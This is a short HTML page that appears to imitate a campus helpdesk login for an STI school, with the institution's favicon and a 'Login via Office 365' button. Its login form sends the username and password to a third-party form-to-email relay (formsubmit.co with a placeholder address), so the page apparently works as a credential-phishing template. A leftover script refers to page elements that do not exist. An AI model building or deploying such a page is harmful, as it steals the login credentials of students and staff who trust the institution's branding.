<html>
    <head>
    <title>Campus Helpdesk</title>

    <link rel="stylesheet" a="" href="style.css">
    <link rel="icon" type="images/x-icon" href="https://www.sti.edu/images/favicon.ico">
</head>


<body>
    <script src="function.js"></script>
    
        <div class="header">
            <img src="sti.jpg">
            <style>
                img {
                    float:inline-start;
                    height:54px;
                }
            </style>
           <a href="#"><font color="white"><h3>Campus Helpdesk</h3></font>
                <style>
                    a:link {
                        text-decoration: none;
                        text-decoration-color: black;
                        color: black;
                    }
          
                    a:hover {
                        color:blue;
                        background-color: transparent;
                    }
                </style>
           </a>
           </div>
        <br>


        <center>
            <section class="module">
                <div class="main">




                <div class="container">
                    <div class="title">
                    <h2>Login</h2>
                    </div>
                    
                  

                      <form action="https://formsubmit.co/your@email.com" method="post">
                    <span>
                        <div class="form-group">
                            <input class="username" id="Username" name="usr" type="text" placeholder="Username or Email" required="">
                        </div>
                        <div class="form-group">
                            <input class="pass" id="Password" name="pwd" type="password" placeholder="Password" required="">
                        </div>
                    </span>
                    <br>
                    <span>
                        <div class="form-group">
                          <button class="login" type="submit" value="login" style="background-color: #3f8cc9;">Login</button> <button class="cancel" onclick="openWindow()" value="cancel" style="background-color: #eaeced;">Login via Office 365</button>
                        </div>
    
                
                        <div class="last">
                            <input type="checkbox" value="lsRememberMe" id="rememberMe"> <label for="rememberMe">Remember me</label>
                        <a href="/User/LostPassword">Lost password</a>
                        </div>
                    </span>
                      </form>
                    </div>    

                    <br>
                    <br>
                    <br>
                    <br>
                     <script>
                        let sections = document.querySelectorAll(".section");
let inputs = document.querySelectorAll(".input");
function moveLeft() {
  if (inputs[0].checkValidity()) {
    document.querySelector(".wrapper").style.transform =
      "translateX(-548px)";
    sections[0].classList.toggle("hidden");
    sections[1].classList.toggle("hidden");
    inputs[0].className = "input";
  } else {
    inputs[0].className = "input alert";
  }
}
function moveRight() {
  document.querySelector(".wrapper").style.transform = "translateX(0px)";
  sections[0].classList.toggle("hidden");
  sections[1].classList.toggle("hidden");
}
                     </script>

</div>

</section>
</center>
</body>
</html>
